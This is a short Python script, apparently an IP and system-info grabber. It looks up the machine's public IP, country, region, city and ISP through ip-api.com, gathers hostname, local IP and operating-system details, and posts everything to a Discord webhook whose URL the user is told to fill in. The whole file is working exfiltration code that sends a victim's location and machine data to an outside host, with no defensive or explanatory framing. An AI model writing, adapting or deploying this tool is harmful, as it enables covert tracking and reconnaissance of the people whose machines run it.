import json
from dhooks import Webhook
import socket
import os
import platform
import requests
import geocoder

hook = Webhook("REPLACE-THIS-WITH-YOUR-WEBHOOK")

response = requests.get("http://ip-api.com/json/?fields=61439")
ip_data = response.json()
hostname = socket.gethostname()
IPA = socket.gethostbyname(hostname)
hook.send(f"Local IP: {IPA}")

print(response.status_code)
public_ip = ip_data.get('query', 'N/A')  
ip_message = f"Public IP Info:\nPublic IP: {public_ip}\nCountry: {ip_data.get('country', 'N/A')}\nRegion: {ip_data.get('regionName', 'N/A')}\nCity: {ip_data.get('city', 'N/A')}\nISP: {ip_data.get('isp', 'N/A')}"
#vcrvix wuz here
system_data = platform.uname()
system_info = {
    "Node": system_data.node,
    "System": system_data.system,
    "Machine": system_data.machine,
    "Release": system_data.release,
    "Version": system_data.version,
    "Local IP": IPA
}
system_info_json = json.dumps(system_info, indent=4)
ip_data_json = json.dumps(ip_data, indent=4)

hook.send(f"```json\n{ip_data_json}\n```")
hook.send(f"```json\n{system_info_json}\n```")

#if platform.system() == 'Linux':
  #  os.system("clear")
#else:
 #   os.system("cls")
